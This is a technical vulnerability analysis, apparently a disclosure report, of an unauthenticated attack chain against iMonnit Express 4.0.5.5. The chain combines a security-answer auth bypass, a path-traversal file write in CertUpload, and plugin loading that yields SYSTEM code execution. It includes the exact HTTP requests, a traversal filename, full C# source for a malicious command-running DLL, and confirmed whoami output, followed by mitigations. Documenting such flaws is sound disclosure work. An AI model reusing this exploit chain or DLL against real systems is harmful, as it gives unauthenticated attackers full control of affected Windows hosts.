# iMonnit Express Unauthenticated Auth Bypass + Path Traversal + Plugin Load SYSTEM RCE — Technical Analysis

## Overview

iMonnit Express 4.0.5.5 is an ASP.NET Core 3.1 + Kestrel + SQLite application running as a Windows service ("iMonnit Express") with **LocalSystem** privileges. It has no global `[Authorize]` filter and no antiforgery token; authentication is per-action. Three flaws combine into a fully unauthenticated root RCE chain, all in the default configuration:

1. **Auth bypass (CWE-287)**: `AccountController.CheckAnswer` (line 177, no `[Authorize]`) iterates the user's `SecurityAnswer` list; when the list is empty, the `foreach` loop is skipped and `SignInAsync` issues a valid admin cookie.
2. **Path-traversal file write (CWE-22)**: `GatewayController.CertUpload` (line 700, `[Authorize]` but reachable with the forged cookie) writes `CertSaveFolder + file.FileName` synchronously with no sanitization.
3. **Plugin-load RCE (CWE-502/915)**: `Plugin.StartPlugins` calls `Assembly.Load` + `Activator.CreateInstance` on the plugin's parameterless ctor BEFORE the `is IExpressPlugin` check; attacker-controlled `Path`/`Class` come from unauthenticated `ConfigurePlugin`, and the ctor runs as LocalSystem.

Dynamically verified: `whoami` = `nt authority\system`, executed inside the `Express_Core` service process, marker owner = BUILTIN\Administrators.

- **Authentication required**: None (unauthenticated)
- **Preconditions**: Default configuration; network reachability to the HTTPS port (8444)
- **Affected versions**: 4.0.5.5
- **Privilege**: NT AUTHORITY\SYSTEM (LocalSystem)

## Architecture

```
L1 external access: HTTPS (default 8444) ASP.NET Core + Kestrel
L2 auth boundary: no global [Authorize], no antiforgery token; per-action auth
L3 source A: POST /Account/CheckAnswer (email) -> empty SecurityAnswer list -> SignInAsync -> admin cookie
L4 source B: POST /Gateway/CertUpload (cookie) -> path = CertSaveFolder + file.FileName (no sanitization) -> sync write
L5 source C: POST /Plugin/ConfigurePlugin (no [Authorize]) -> plugin.Path / plugin.Class attacker-controlled
L6 trigger: POST /Settings/SettingsEdit (EnablePlugins=true) -> Plugin.StartPlugins
L7 sink: Assembly.Load(File.ReadAllBytes(path)) -> Activator.CreateInstance(type) -> ctor runs as LocalSystem
L8 exec: ctor code runs as NT AUTHORITY\SYSTEM
```

## Stage 1: Sink Identification

`Express_Core.Models/Plugin.cs` StartPlugins (lines 197-233):

```csharp
public static void StartPlugins(PluginHelper pluginHelper)
{
    List<Plugin> list = LoadAllActive();
    foreach (Plugin item in list)
    {
        try {
            string path = item.Path;
            if (File.Exists(path)) goto IL_0063;
            path = ExpressUtil.RootPath + item.Path;
            if (File.Exists(path)) goto IL_0063;
            Console.WriteLine("Plugin file not found: " + item.Path);
            goto end_IL_0024;
            IL_0063:
            Assembly assembly = Assembly.Load(File.ReadAllBytes(path));  // L218 loads DLL
            Type type = assembly.GetType(item.Class);                     // L219
            object obj = Activator.CreateInstance(type);                  // L220 runs parameterless ctor
            if (obj is IExpressPlugin) { ... }                            // L221 check AFTER ctor
            end_IL_0024:;
        } catch (Exception ex) { ex.Log("Plugin.StartServer Failed"); }
    }
}
```

The key sink: `Activator.CreateInstance(type)` at L220 runs the parameterless ctor **before** the `is IExpressPlugin` check at L221. A malicious DLL need not implement `IExpressPlugin` — its parameterless ctor runs. `item.Path` (Assembly.Load path) and `item.Class` (GetType name) come from the Plugin DB record, settable via unauthenticated `ConfigurePlugin`. The service runs as LocalSystem, so ctor code runs as SYSTEM.

## Stage 2: Source Identification

### Source A — plugin config (unauthenticated)

`Express_Core.Controllers/PluginController.cs` ConfigurePlugin (line 25, no `[Authorize]`):

```csharp
public ActionResult ConfigurePlugin(IFormCollection collection)
{
    Plugin.StopPlugins();
    Plugin plugin = Plugin.Load(long.Parse(collection["PluginID"]));
    plugin.Name = collection["Name"];
    plugin.Class = collection["Class"];   // controls GetType type name
    plugin.Path = collection["Path"];     // controls Assembly.Load path
    plugin.Url = collection["Url"];
    plugin.Svg = collection["Svg"];
    plugin.Save();
    if (ConfigData.FindValue("EnablePlugins").ToBool())
        Plugin.StartPlugins(PluginHelper.Instance);
    return RedirectToAction("Index");
}
```

`TogglePlugin` (line 93, no `[Authorize]`) sets `IsActive`. `SettingsEdit` (line 22, no `[Authorize]`) sets `EnablePlugins=true` and triggers `Plugin.StartPlugins`.

### Source B — auth bypass (unauthenticated, obtains cookie for the [Authorize] file-write endpoint)

`Express_Core.Controllers/AccountController.cs` CheckAnswer (line 177, no `[Authorize]`):

```csharp
public async Task<ActionResult> CheckAnswer(IFormCollection collection)
{
    string email = collection["email"].ToString();
    UserProfile userProfile = UserProfile.FindEmail(email);
    List<SecurityAnswer> list = SecurityAnswer.LoadByUserID(userProfile.UserID);
    foreach (SecurityAnswer item in list)   // empty list -> loop skipped
    {
        string password = collection["SecurityAnswerID_" + item.SecurityQuestionID].ToString().ToLower();
        byte[] x = ExpressUtil.GenerateHash(password, item.Salt, item.WorkFactor);
        if (!StructuralComparisons.StructuralEqualityComparer.Equals(x, item.Answer))
            return Content("Incorrect Answers");
    }
    ClaimsPrincipal principal = UserProfile.CreatePrincipal(userProfile);
    await base.HttpContext.SignInAsync("Cookies", principal);   // empty list -> cookie issued directly
    return Content("Success");
}
```

Root cause: for a user with an empty `SecurityAnswer` list (default admin has a password but no security questions), the `foreach` loop is skipped and `SignInAsync` issues that user's auth cookie. Any attacker obtains an admin cookie without credentials.

### Source C — file-write primitive ([Authorize], using the Source B cookie)

`Express_Core.Controllers/GatewayController.cs` CertUpload HttpPost (line 700, `[Authorize]`):

```csharp
[Authorize][HttpPost]
public ActionResult CertUpload(long id, CertUploadModel model, IFormFile file)
{
    Express_Core.Models.Gateway gateway = Express_Core.Models.Gateway.Load(id);
    if (gateway == null || gateway.GatewayID != ConfigData.AppSettings("LocalGatewayID").ToLong())
    {
        Redirect("/Gateway/GatewayList");   // bare statement, no return -> check ineffective
    }
    string text = ConfigData.AppSettings("CertSaveFolder");   // = "./certs/"
    if (file == null || file.Length < 1) { base.ModelState.AddModelError("File", "File required"); }
    if (base.ModelState.IsValid)
    {
        string path = text + file.FileName;   // path traversal: file.FileName attacker-controlled
        using (FileStream target = new FileStream(path, FileMode.Create))
        {
            file.CopyTo(target);   // synchronous write (reliable)
        }
        // MQTT config update (try/catch, does not affect the completed write)
    }
}
```

Key points:
- `path = CertSaveFolder + file.FileName` -> `file.FileName` traversal (`..\..\..\Windows\Temp\evil.dll`) writes an arbitrary path
- `file.CopyTo(target)` is **synchronous** (contrast: `SettingsController.CertUpload`'s `CopyToAsync` without await is a nondeterministic 0-byte bug, unusable)
- The gateway-ID check `Redirect(...)` without `return` is ineffective (as long as `file` is non-empty, `ModelState.IsValid` is true)

## Stage 3: Data Flow

```
Attacker (no credentials)
  |
  |-[1] POST /Account/CheckAnswer {email=admin@montest.local}
  |       SecurityAnswer empty list -> foreach skipped -> SignInAsync
  |       returns valid .AspNetCore.Cookies cookie  ★auth bypass
  |
  |-[2] POST /Gateway/CertUpload (cookie) {file.FileName=..\..\..\Windows\Temp\evil.dll, file=<malicious DLL>}
  |       path = "./certs/" + "..\..\..\Windows\Temp\evil.dll" -> path traversal
  |       file.CopyTo(target) sync write -> C:\Windows\Temp\evil.dll  ★arbitrary file write
  |
  |-[3] POST /Plugin/ConfigurePlugin {PluginID=1, Class=E.T, Path=C:\Windows\Temp\evil.dll}
  |       plugin.Save() writes DB  ★plugin config
  |
  |-[4] POST /Plugin/TogglePlugin {id=1, enablePlugin=true}
  |       plugin.IsActive=true  ★activate
  |
  +-[5] POST /Settings/SettingsEdit {EnablePlugins=true}
          Plugin.StartPlugins()
            Assembly.Load(evil.dll) -> Activator.CreateInstance(E.T)
              malicious DLL parameterless ctor executes  ★SYSTEM RCE (LocalSystem)
```

## Stage 4: Exploit Construction

Malicious plugin DLL (command runner, netstandard2.0, pure .NET stdlib):

```csharp
using System; using System.Diagnostics; using System.IO;
namespace E { public class T {
  public T() {
    try {
      string cmd = File.ReadAllText(@"C:\Windows\Temp\monnit_cmd.txt").Trim();
      var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd) {
        RedirectStandardOutput = true, RedirectStandardError = true,
        UseShellExecute = false, CreateNoWindow = true };
      var p = Process.Start(psi);
      string o = p.StandardOutput.ReadToEnd(), e = p.StandardError.ReadToEnd();
      p.WaitForExit(15000);
      File.WriteAllText(@"C:\Windows\Temp\monnit_out.txt",
        "EXIT=" + p.ExitCode + "\n---STDOUT---\n" + o + "\n---STDERR---\n" + e + "\n---WHOAMI---\n" + Environment.UserName);
    } catch (Exception ex) { File.WriteAllText(@"C:\Windows\Temp\monnit_out.txt", "CTOR-ERR: " + ex.Message); }
  }
}}
```

The command file `monnit_cmd.txt` is written via the same CertUpload path-traversal primitive. The exploit script writes cmd.txt, then runner.dll, then configures the plugin, then triggers it.

## Stage 5: Dynamic Verification

### Step 1 — auth bypass
```
POST /Account/CheckAnswer HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=admin@montest.local

-> HTTP 200 "Success"
-> Set-Cookie: .AspNetCore.Cookies=<valid>; path=/; ...
```

### Step 2 — file write
```
POST /Gateway/CertUpload HTTP/1.1
Cookie: .AspNetCore.Cookies=<step-1 cookie>
Content-Type: multipart/form-data; boundary=...
(multipart: id=945505, certType=Client_Certificate_File,
 file.filename=..\..\..\..\..\..\..\..\..\..\..\Windows\Temp\evil.dll,
 file.content=<4608-byte DLL>)

-> HTTP 200, evil.dll WROTE 4608 bytes
```

### Steps 3-5
```
POST /Plugin/ConfigurePlugin -> HTTP 200
POST /Plugin/TogglePlugin    -> HTTP 200 "Success"
POST /Settings/SettingsEdit  -> HTTP 200 (triggers StartPlugins)
```

### Target-side verification
```
=== marker C:\Windows\Temp\monnit_rce_marker.txt ===
RCE-CONFIRMED
user=IZTBZS9XSDVLLLZ$          <- machine account = LocalSystem
os=Microsoft Windows NT 6.2.9200.0
proc=Express_Core              <- executed inside the target service process
owner=BUILTIN\Administrators

=== whoami /all ===
User Name          SID
nt authority\system S-1-5-18    <- NT AUTHORITY\SYSTEM
```

## Stage 6: Reachability

- Default config: the plugin system exists by default (PluginID=1 default record); `EnablePlugins` can be turned on via unauthenticated `SettingsEdit`; LocalSystem is the default privilege.
- Network reachability to the HTTPS port suffices; no credentials.
- **Bypass condition**: a **real existing user with an empty SecurityAnswer list** is needed. The default admin (created at first-run, SaltedPassword set = has a password, but no security questions -> SecurityAnswer table has 0 records) satisfies this. A nonexistent email fails (FindEmail returns empty user -> CreatePrincipal throws NRE -> HTTP 500, no cookie — verified).

## Mitigation

1. Add a global `[Authorize]` filter (or `[Authorize]` on `CheckAnswer`, `ConfigurePlugin`, `TogglePlugin`, `SettingsEdit`, `CertUpload`)
2. Require the security-answer check to fail closed when the list is empty (do not sign in)
3. Sanitize/allowlist the upload filename in `CertUpload` (reject `..`, validate extension/path against the cert folder)
4. Move the `is IExpressPlugin` check BEFORE `Activator.CreateInstance`, and restrict plugin loading to a signed allowlist of assemblies
5. Run the service under a low-privilege account instead of LocalSystem

## CWEs

- CWE-287 (Improper Authentication) - CheckAnswer signs in with empty security-answer list
- CWE-22 (Improper Limitation of a Pathname to a Restricted Directory) - CertUpload filename traversal
- CWE-502/915 (Deserialization / Dynamic Code Loading) - Activator.CreateInstance of attacker DLL
- CWE-306 (Missing Authentication for Critical Function) - no global [Authorize], antiforgery missing
- CWE-250 (Execution with Unnecessary Privileges) - service runs as LocalSystem
